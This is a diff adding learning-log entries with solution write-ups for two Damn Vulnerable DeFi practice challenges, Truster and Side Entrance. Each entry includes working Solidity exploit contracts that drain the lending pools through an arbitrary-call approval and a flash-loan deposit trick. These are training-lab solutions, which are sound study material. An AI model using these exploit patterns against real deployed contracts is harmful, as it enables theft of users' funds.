@@ -246,5 +246,165 @@ This PoC demonstrates how the identified vulnerabilities can be exploited to dra
 
 ### 2024.08.31
 
+# Damn Vulnerable DeFi - Truster Challenge - Solution Report
+
+## Problem Analysis
+
+### Goal
+
+Drain all 1 million DVT tokens from the TrusterLenderPool contract in a single transaction and transfer them to a designated recovery account.
+
+### Contract Summary
+
+The TrusterLenderPool contract offers a flashLoan function that allows borrowing tokens for free. It transfers the requested amount to the borrower and then executes an arbitrary function call to a specified target address with provided data.
+
+## Vulnerability
+
+The vulnerability lies in the flashLoan function's ability to execute arbitrary function calls on behalf of the pool contract. This can be exploited to approve an attacker's contract to spend the pool's tokens without any restrictions.
+
+## Attack Methodology
+
+1. Create an attack contract that performs the following steps in its constructor:
+   a. Prepare calldata to approve the attack contract to spend all of the pool's tokens.
+   b. Call the flashLoan function with a zero amount, using the pool as the target and the approval calldata.
+   c. Transfer all tokens from the pool to the recovery address using the gained approval.
+
+2. Deploy the attack contract in a single transaction, which will execute the entire attack sequence.
+
+## Proof of Concept (PoC)
+
+1. The TrusterAttack contract implements the entire attack in its constructor:
+
+```solidity
+contract TrusterAttack {
+    constructor(TrusterLenderPool pool, DamnValuableToken token, address player, address recovery) {
+        // Step 1: Create the calldata for approving this contract to spend all of the pool's tokens
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+
+        // Step 2: Call flashLoan with 0 amount
+        pool.flashLoan(0, player, address(token), data);
+
+        // Step 3: Now that we have approval, transfer all tokens from the pool to the recovery address
+        uint256 balance = token.balanceOf(address(pool));
+        token.transferFrom(address(pool), recovery, balance);
+    }
+}
+```
+
+2. The test_truster function in the TrusterChallenge contract deploys the attack contract:
+
+```solidity
+function test_truster() public checkSolvedByPlayer {
+    // Deploy the TrusterAttack contract
+    // This single line performs the entire attack:
+    // 1. Approves the attacker contract to spend the pool's tokens
+    // 2. Transfers all tokens from the pool to the recovery address
+    // This is the only transaction executed by the player, ensuring their nonce is exactly 1
+    new TrusterAttack(pool, token, player, recovery);
+}
+```
+
+This single line of code executes the entire attack in one transaction, fulfilling the challenge requirement of the player's nonce being exactly 1.
+
+# Damn Vulnerable DeFi - Side Entrance - Solution Report
+
+## Problem Analysis
+
+### Goal
+
+The goal is to drain all 1000 ETH from the SideEntranceLenderPool contract and transfer it to a designated recovery account, starting with only 1 ETH in the player's balance.
+
+### Contract Summary
+
+The SideEntranceLenderPool contract allows users to deposit ETH, withdraw their balance, and take out flash loans. It maintains a mapping of user balances and provides free flash loans using the deposited ETH.
+
+## Vulnerability
+
+The vulnerability lies in the flash loan mechanism and how it interacts with the deposit function. The contract doesn't differentiate between actual deposits and internal transfers during a flash loan, allowing an attacker to artificially inflate their balance.
+
+## Attack Methodology
+
+1. Create an attack contract that implements the IFlashLoanEtherReceiver interface.
+2. Request a flash loan for the entire pool balance.
+3. During the flash loan callback, deposit the borrowed funds back into the pool.
+4. After the flash loan completes, withdraw the entire balance, which now includes the artificially inflated amount.
+5. Transfer the drained funds to the recovery address.
+
+## Proof of Concept (PoC)
+
+The attack is implemented in the `SideEntranceAttack` contract:
+
+```solidity
+contract SideEntranceAttack {
+    SideEntranceLenderPool private immutable pool;
+    address private immutable owner;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        owner = msg.sender;
+    }
+
+    // This function is called by the pool during the flash loan
+    function execute() external payable {
+        require(msg.sender == address(pool), "Only pool can call");
+        // Deposit the borrowed ETH back into the pool
+        // This increases our balance in the pool's accounting
+        pool.deposit{value: msg.value}();
+    }
+
+    // Main attack function
+    function attack() external {
+        require(msg.sender == owner, "Only owner can call");
+        // Get the current balance of the pool
+        uint256 poolBalance = address(pool).balance;
+        // Request a flash loan for the entire pool balance
+        pool.flashLoan(poolBalance);
+        // After the flash loan, withdraw all our "deposited" funds
+        pool.withdraw();
+    }
+
+    // Function to withdraw funds from this contract to a specified recipient
+    function withdraw(address recipient) external {
+        require(msg.sender == owner, "Only owner can call");
+        uint256 balance = address(this).balance;
+        (bool success,) = recipient.call{value: balance}("");
+        require(success, "Transfer failed");
+    }
+
+    // Fallback function to receive ETH
+    receive() external payable {}
+}
+```
+
+The attack is executed in the test function:
+
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    // Deploy the attack contract
+    SideEntranceAttack attacker = new SideEntranceAttack(address(pool));
+
+    // Perform the attack
+    attacker.attack();
+
+    // Withdraw the funds to the recovery address
+    attacker.withdraw(recovery);
+}
+```
+
+This PoC successfully drains the entire pool balance of 1000 ETH and transfers it to the recovery address, achieving the goal of the challenge.
+
+
+### 2024.09.01
+
+1. Damn Vulnerable DeFi - The Rewarder
+   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/05-the-rewarder/05-the-rewarder-solution.md)
+   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/05-the-rewarder/TheRewarder.t.sol)
+
+2. Damn Vulnerable DeFi - Selfie
+   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/06-selfie/06-selfie-solution.md)
+   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/06-selfie/Selfie.t.sol)
+
+
+
 
 <!-- Content_END -->
